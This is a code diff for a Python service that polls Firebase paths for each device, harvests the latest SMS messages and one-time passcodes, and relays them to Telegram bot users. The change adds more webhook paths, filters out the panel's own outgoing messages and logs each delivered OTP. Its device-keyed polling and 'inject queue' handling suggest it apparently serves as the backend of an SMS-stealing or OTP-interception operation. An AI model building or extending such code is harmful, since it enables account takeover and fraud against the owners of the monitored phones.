@@ -63,7 +63,17 @@ BODY_FIELDS = (
     "otp",
     "code",
 )
-SINGLETON_SMS_SUFFIXES = ("/lastSms", "/last_sms", "/latest_sms", "/otp", "/lastMessage")
+SINGLETON_SMS_SUFFIXES = (
+    "/lastSms",
+    "/last_sms",
+    "/latest_sms",
+    "/otp",
+    "/lastMessage",
+    "/webhookEvent/receiveSms",
+    "/webhookEvent/incomingSms",
+    "/webhookEvent/newSms",
+    "/webhookEvent/smsIn",
+)
 TIME_FIELDS = ("time", "date", "timestamp", "ts", "received_at", "created_at", "createdAt")
 SEEN_META_KEY = "firebase_sms_seen"
 BASELINE_META_KEY = "firebase_sms_baseline"
@@ -321,6 +331,18 @@ def _is_inject_queue_entry(value: dict[str, Any]) -> bool:
     return False
 
 
+def _is_channel_outgoing_webhook(value: dict[str, Any]) -> bool:
+    """Skip tgtoken/webhookEvent/sendSms outbound (channel auto-token)."""
+    if "isSended" in value:
+        return True
+    to_val = str(value.get("to") or "").strip()
+    from_val = str(value.get("from") or "").strip()
+    if to_val and len(re.sub(r"\D", "", to_val)) >= 10:
+        if from_val in {"0", "1", "2"} or not from_val:
+            return True
+    return False
+
+
 POLL_NOISE_BODIES = frozenset(
     {
         "pong",
@@ -366,8 +388,12 @@ def _parse_sms_entry(firebase_key: str, value: Any) -> dict[str, Any] | None:
 
     if _is_inject_queue_entry(value):
         return None
+    if _is_channel_outgoing_webhook(value):
+        return None
 
     sender = _first_field(value, SENDER_FIELDS)
+    if sender in {"0", "1", "2"} and value.get("to"):
+        return None
     body = _first_field(value, BODY_FIELDS)
 
     nested = value.get("lastSms") or value.get("last_sms") or value.get("sms")
@@ -539,7 +565,16 @@ def _generate_sms_paths(device: Device) -> list[str]:
                 seen_paths.add(path)
                 paths.append(path)
         for parent in SMS_PARENT_PATHS:
-            for suffix in ("lastSms", "last_sms", "latest_sms", "otp", "lastMessage"):
+            for suffix in (
+                "lastSms",
+                "last_sms",
+                "latest_sms",
+                "otp",
+                "lastMessage",
+                "webhookEvent",
+                "webhookEvent/receiveSms",
+                "webhookEvent/incomingSms",
+            ):
                 path = f"{parent}/{device_id}/{suffix}"
                 if path not in seen_paths:
                     seen_paths.add(path)
@@ -606,7 +641,7 @@ def _dedupe_records(records: list[dict[str, Any]]) -> list[dict[str, Any]]:
 
 
 def _build_otp_sidecar_paths(device: Device) -> list[str]:
-    """Only 3 paths — merged every poll so lastSms OTP is never missed."""
+    """Hot OTP paths — lastSms + webhook incoming (same panel as channel sendSms)."""
     sidecar: list[str] = []
     for device_id in _device_ids(device):
         sidecar.extend(
@@ -614,12 +649,24 @@ def _build_otp_sidecar_paths(device: Device) -> list[str]:
                 f"clients/{device_id}/lastSms",
                 f"clients/{device_id}/otp",
                 f"clients/{device_id}/sms",
+                f"clients/{device_id}/webhookEvent/receiveSms",
+                f"clients/{device_id}/webhookEvent/incomingSms",
+                f"clients/{device_id}/webhookEvent/newSms",
+                f"clients/{device_id}/webhookEvent",
             ]
         )
     if device.firebase_key:
         fk = device.firebase_key.strip("/")
-        sidecar.extend([f"{fk}/lastSms", f"{fk}/otp", f"{fk}/sms"])
-    return list(dict.fromkeys(sidecar))[:6]
+        sidecar.extend(
+            [
+                f"{fk}/lastSms",
+                f"{fk}/otp",
+                f"{fk}/sms",
+                f"{fk}/webhookEvent/receiveSms",
+                f"{fk}/webhookEvent",
+            ]
+        )
+    return list(dict.fromkeys(sidecar))[:10]
 
 
 _poll_cycle: dict[int, int] = {}
@@ -923,6 +970,12 @@ async def _poll_one_monitoring_profile(profile_id: int) -> int:
             db.commit()
             new_keys.add(dedup_key)
             processed += 1
+            logger.info(
+                "OTP/SMS delivered to bot user=%s sender=%s path_key=%s",
+                profile.telegram_user_id,
+                sender,
+                dedup_key[:80],
+            )
 
         if new_keys:
             mark_sms_keys_seen(device, new_keys)
